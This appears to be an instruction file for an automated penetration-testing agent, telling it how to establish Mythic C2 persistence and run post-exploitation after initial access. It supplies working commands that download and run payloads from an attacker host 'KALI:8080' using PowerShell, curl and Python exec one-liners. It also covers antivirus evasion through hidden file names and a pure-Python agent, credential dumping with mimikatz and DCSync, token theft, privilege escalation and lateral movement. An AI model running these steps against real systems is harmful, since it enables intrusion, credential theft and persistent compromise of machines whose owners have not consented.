## Mythic C2 Deployment & Post-Exploitation Instructions

You have gained initial access to the target. Your next step is to establish
persistent C2 access via Mythic.

### Steps:

1. **Check Mythic server status**:
   ```bash
   python3 /opt/tazosploit/scripts/mythic_c2.py --action status --json
   ```

2. **Identify target OS/arch** from prior recon (services.json, tech_fingerprint.json)

3. **Generate payload** using the appropriate agent:
   ```bash
   # Windows target → Apollo
   python3 /opt/tazosploit/scripts/mythic_c2.py \
     --action create-payload --agent apollo --os windows --arch x64 \
     --c2-profile http --json

   # Linux target → Poseidon
   python3 /opt/tazosploit/scripts/mythic_c2.py \
     --action create-payload --agent poseidon --os linux --arch amd64 \
     --c2-profile http --json

   # Python available on target → Medusa (no binary, stealthiest)
   python3 /opt/tazosploit/scripts/mythic_c2.py \
     --action create-payload --agent medusa --os python \
     --c2-profile http --json
   ```

4. **Deliver the payload** using the appropriate method:
   - RCE on Windows: `powershell -c "IWR -Uri http://KALI:8080/payload.exe -OutFile C:\Windows\Temp\svc.exe; C:\Windows\Temp\svc.exe"`
   - RCE on Linux: `curl http://KALI:8080/payload -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &`
   - Python target: `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://KALI:8080/medusa.py').read())"`
   - File upload: Upload through the vulnerability, then execute
   - SSH/SCP: `scp payload user@target:/tmp/ && ssh user@target '/tmp/payload &'`

5. **Verify callback**:
   ```bash
   python3 /opt/tazosploit/scripts/mythic_c2.py --action list-callbacks --json
   ```

6. **Run post-exploitation** (automated full suite):
   ```bash
   python3 /opt/tazosploit/scripts/mythic_c2.py \
     --action post-exploit-all --callback-id {CALLBACK_ID} \
     --output-dir /pentest/output/$JOB_ID --json
   ```

### Decision Matrix:

| Access Type | Target OS | Agent | Delivery Method |
|------------|-----------|-------|-----------------|
| RCE | Windows | Apollo | PowerShell download + execute |
| RCE | Linux | Poseidon | curl/wget download + execute |
| RCE | Any (Python) | Medusa | Python one-liner eval |
| File upload | Windows | Apollo | Upload through vuln + execute |
| File upload | Linux | Poseidon | Upload + chmod + execute |
| Web shell | Any | Medusa | Python eval through web shell |
| SQLi (stacked) | Windows | Apollo | xp_cmdshell → PowerShell |
| SQLi (stacked) | Linux | Poseidon | COPY TO PROGRAM → curl |
| SSH access | Linux/macOS | Poseidon | SCP + execute |
| SMB access | Windows | Apollo | smbclient upload + PsExec |

### Post-Exploitation Decision Tree:

**If unprivileged:**
1. Run `getprivs` to check available privileges
2. Apollo: Try `printspoofer` if SeImpersonate is available
3. Poseidon: Check SUID binaries, sudo -l, cron jobs
4. If privesc succeeds, re-enumerate as privileged user

**If privileged (SYSTEM/root):**
1. Dump credentials: `mimikatz sekurlsa::logonpasswords` (Apollo)
2. DCSync if domain-joined: `dcsync -Domain CORP.LOCAL`
3. Capture screenshot for evidence
4. Start SOCKS proxy for pivoting

**If domain-joined (Windows):**
1. Execute SharpHound via `execute_assembly` for AD mapping
2. Identify high-value targets (DCs, file servers, DBs)
3. Link P2P agents via SMB to internal targets
4. Use `make_token` / `steal_token` for credential abuse

### If Callback Fails:
1. Verify payload matches target OS/arch
2. Check firewall — try different C2 profile (HTTP→TCP, or SMB for internal)
3. Check for AV — Medusa is pure Python (harder to detect)
4. Try smaller payload with fewer commands loaded
5. After 3 failures, fall back to manual post-exploitation

### Success = Callback received and interactive. Document callback ID in c2_session.json.
